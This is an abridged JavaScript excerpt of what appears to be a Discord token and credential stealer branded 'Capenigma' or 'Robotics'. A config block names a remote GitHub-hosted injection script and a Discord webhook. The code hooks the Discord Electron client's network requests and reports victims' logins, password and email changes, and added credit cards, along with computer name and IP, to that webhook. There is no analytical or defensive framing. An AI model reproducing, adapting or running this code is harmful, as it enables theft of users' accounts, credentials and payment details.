...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Capenigma/-0-00-yusqtdguiqstdo-lkqsydgfoi_qstdo-muqsgbnoidbl/main/sduifvbysidu/qsd/DSF/SDF/SD/FSD/FHZMSE/RFNERM/FBAZEM/FAZME/DCAZEP%C2%B0CF/ZEP/FP%C2%B0AZ/EP%C2%B0Z/FP%C2%B0ZE/F%C2%B0PAZE/F%C2%B0P/EP%C2%B0F/ZP%C2%B0HKL%C2%B0PFLSPD/FP%C2%B0SD/index.js",
    webhook: "https://discord.com/api/webhooks/1084852660286541904/Ojur1aWRTFnsu8G_M1HmA5ZDgCygvecIdSLDs_aAYgJjwlFXYc_IvN-WDLExh53JsaV2",
...
const makeEmbed = async ({
    ...
    var params = {
        username: "Robotics",
        avatar_url: "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExOTNlNGE0NjcyNjlmYzAyMmQ1YzViZmM2ZTllYTRlYjI2YjE2NzYzNyZjdD1n/iiW3D9Q4iBejvri2X0/giphy.gif",
        content: "",
        embeds: [{
            title: title,
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExOTNlNGE0NjcyNjlmYzAyMmQ1YzViZmM2ZTllYTRlYjI2YjE2NzYzNyZjdD1n/iiW3D9Q4iBejvri2X0/giphy.gif"
        if (!user.banner) var userBanner = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7S7JrRahwortZqMvYculT-717RUcIpfK8qw&usqp=CAU"
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Robotics User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Capenigma Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "Robotics User Login",
                description: "Capenigma",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Robotics Detect Password Changed",
                    description: "Capenigma",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Robotics Detect Email Changed",
                    description: "Capenigma",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Robotics User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
